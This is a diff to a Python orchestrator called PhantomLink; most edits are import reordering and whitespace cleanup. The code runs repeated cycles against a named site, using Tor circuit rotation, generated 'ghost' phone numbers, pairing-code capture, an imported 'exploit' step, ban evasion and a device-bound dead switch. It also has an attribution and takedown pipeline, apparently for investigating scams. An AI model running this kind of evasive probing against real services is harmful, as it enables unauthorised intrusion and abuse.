@@ -1,14 +1,19 @@
 """PhantomLink Core Orchestrator — Phase 7 Hardened"""
-import asyncio, sys, json, hashlib, time, os
+import asyncio
+import hashlib
+import json
+import os
+import sys
 from datetime import datetime
+
 from phantom.deadswitch import dead_switch_check
-from phantom.resilience import retry_with_backoff, zapero_circuit, tripwire, session_recovery
-from phantom.tor_rotator import ensure_tor_running, rotate_circuit, get_circuit_stats
-from phantom.number_gen import generate_ghost_number
-from phantom.recon import map_target
 from phantom.engager import capture_pairing_code, ensure_chromium
 from phantom.exploit import trigger_link_success
 from phantom.intel_sink import harvest_and_clean
+from phantom.number_gen import generate_ghost_number
+from phantom.recon import map_target
+from phantom.resilience import tripwire, zapero_circuit
+from phantom.tor_rotator import ensure_tor_running, get_circuit_stats, rotate_circuit
 
 TARGETS = {
     "zapero": "https://afrivexa.com/home?invite_code=4750",
@@ -22,39 +27,39 @@ RETRY_DELAY = 5
 async def run_cycle(target_key: str, cycle: int = 1) -> dict:
     target_url = TARGETS.get(target_key, TARGETS["zapero"])
     op_id = hashlib.sha256(f"{target_key}{datetime.utcnow().isoformat()}{cycle}".encode()).hexdigest()[:8]
-    
+
     async def attempt_cycle():
         print(f"\n[PhantomLink:{op_id}] Cycle {cycle}")
-        
+
         # Rotate Tor circuit before each cycle
         if cycle > 1:
             rotated = rotate_circuit()
             print(f"[{op_id}] Tor rotation: {'rotated' if rotated else 'skipped (min interval)'}")
-        
+
         ghost_number, country = generate_ghost_number()
         print(f"[{op_id}] Ghost: {ghost_number} ({country})")
-        
+
         api_map = map_target(target_url)
         print(f"[{op_id}] Recon: {api_map.get('confirm_url', 'N/A')}")
-        
+
         pairing_code = await capture_pairing_code(target_url, ghost_number)
         print(f"[{op_id}] Code: {pairing_code}")
-        
+
         # Check for tripwire
         if "FAKECODE" in pairing_code:
             tripwire.record_response(ghost_number, 403)
             if tripwire.is_banned(ghost_number):
                 print(f"[{op_id}] ⚠️ Ghost number possibly banned, rotating")
                 return {"op_id": op_id, "status": "banned", "ghost_number": ghost_number}
-        
+
         result = await trigger_link_success(api_map, pairing_code, ghost_number)
         print(f"[{op_id}] Vector: {result.get('vector_used')} | Status: {result.get('status')}")
-        
+
         log_path = harvest_and_clean(ghost_number, result, op_id, target_key)
         return {"op_id": op_id, "target": target_key, "ghost": ghost_number,
                 "code": pairing_code, "vector": result.get("vector_used"),
                 "status": result.get("status"), "log": log_path}
-    
+
     try:
         return await zapero_circuit.call(attempt_cycle)
     except Exception as e:
@@ -70,13 +75,13 @@ async def main():
     parser.add_argument("--check", action="store_true", help="Validate environment only")
     parser.add_argument("--enroll", action="store_true", help="Enroll device fingerprint")
     args = parser.parse_args()
-    
+
     if args.enroll:
         from phantom.deadswitch import enroll_device
         fp = enroll_device()
         print(f"Device enrolled: {fp[:32]}...")
         return 0
-    
+
     if args.interactive:
         interactive_mode()
         return 0
@@ -84,24 +89,24 @@ async def main():
         from phantom.setup import validate
         validate()
         return 0
-    
+
     # Phase 7: Dead switch — exit if device mismatch
     dead_switch_check()
-    
+
     print("=" * 50)
     print("  PhantomLink — Phase 7: Hardened Operations")
     print(f"  Target: {args.target} | Cycles: {args.cycles}")
     print("=" * 50)
-    
+
     ensure_tor_running()
     print("[OK] Tor running")
-    
+
     ensure_chromium()
     print("[OK] chrome-headless running")
-    
+
     stats = get_circuit_stats()
     print(f"[OK] Tor circuits since start: {stats['total_rotations']}")
-    
+
     results = []
     for i in range(1, args.cycles + 1):
         r = await run_cycle(args.target, i)
@@ -110,7 +115,7 @@ async def main():
             delay = 15 + (i * 5)
             print(f"\n⏳ Cooling down {delay}s...")
             await asyncio.sleep(delay)
-    
+
     print("\n" + "=" * 50)
     print("  PHASE 7 MISSION SUMMARY")
     print("=" * 50)
@@ -128,14 +133,14 @@ if __name__ == "__main__":
 
 def run_intelligence_pipeline():
     """Decrypt all operational logs and generate full dossier."""
-    import os, json, sys
-    from phantom.intel_sink import _load_key
-    from phantom.attribution import DiamondModel, DarkAtlasOverlapModel, ach_matrix
-    from phantom.financial import FinancialTracer
+    from cryptography.fernet import Fernet
+
+    from phantom.attribution import DarkAtlasOverlapModel, DiamondModel, ach_matrix
     from phantom.dossier import DossierGenerator
+    from phantom.financial import FinancialTracer
+    from phantom.intel_sink import _load_key
     from phantom.ioc_extractor import IOCExtractor
     from phantom.takedown import TakedownCoordinator
-    from cryptography.fernet import Fernet
 
     print("=" * 60)
     print("  PhantomLink Phase 9 — Intelligence Pipeline")
